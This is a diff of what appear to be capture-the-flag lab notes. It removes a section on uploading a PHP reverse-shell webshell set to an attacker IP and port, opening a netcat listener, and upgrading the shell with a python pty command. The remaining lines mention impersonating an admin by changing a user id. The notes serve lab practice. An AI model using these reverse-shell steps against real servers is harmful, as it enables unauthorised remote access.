@@ -32,23 +32,6 @@ Found that admin was id=34322 so change the Guest id to simulate he's the admin.
 
 
 # Reverse Shell
-Located in `/usr/share/webshells/php/php-reverse-shell.php`
-Change port and ip and then upload the file.
-```bash
-$ip = '10.10.15.56';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-```
-
-Set up a netcat listener on the same port.
-```bash
-$ nc -lvnp 1234
-```
-
-In order to have a functional shell can execute this command:
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
 Search for common directories. This is a Web Server so is a good idea to check `/var/www/html/xxx/`
 
 !!! PROBLEMES DE VPN 
